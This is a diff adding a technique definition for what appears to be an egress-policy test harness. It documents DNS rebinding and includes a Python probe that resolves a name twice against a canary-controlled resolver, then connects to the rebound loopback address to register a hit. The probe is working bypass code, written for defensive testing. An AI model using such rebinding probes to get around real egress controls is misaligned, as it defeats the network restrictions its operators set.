@@ -1,0 +1,33 @@
+id = "net-dns-rebinding"
+name = "DNS rebinding (TTL flip after the allowlist check)"
+category = "net"
+description = "Resolves a name twice against a resolver the attacker controls. The first answer is a benign, allowlisted address — it passes any name-based egress check; the second answer, moments later, rebinds the same name to a forbidden address, and the connection lands there. The policy check and the connection see different IPs for one name. Here the canary's own DNS responder plays the controlled resolver and flips its answer to loopback on the second lookup; a client that connects to the second answer reaches the canary. Egress policy enforced on names rather than on the connected address is the class this defeats."
+references = [
+  "DNS rebinding (Roesler, 2007) and its modern SSRF/egress-filter variants",
+  "Time-of-check to time-of-use between name resolution and connection",
+]
+
+probe = '''
+python3 -c "
+import socket, struct
+name = '@@NONCE@@.rebind'
+def resolve():
+    q = struct.pack('!HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
+    for part in name.split('.'):
+        q += bytes([len(part)]) + part.encode()
+    q += struct.pack('!HH', 1, 1)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(6)
+    s.sendto(q, ('@@CANARY_HOST@@', @@CANARY_DNS_PORT@@))
+    data, _ = s.recvfrom(512); s.close()
+    return '.'.join(str(b) for b in data[-4:])
+resolve()               # first lookup: the allowlisted answer
+ip = resolve()          # second lookup: rebound
+c = socket.create_connection((ip, @@CANARY_PORT@@), timeout=6)
+c.sendall(b'GET /hit/@@TECH_ID@@/@@NONCE@@ HTTP/1.0\r\nHost: @@NONCE@@.rebind\r\n\r\n')
+c.recv(64); c.close()
+"
+'''
+
+[preconditions]
+bins = ["python3"]
+oracle = "canary"
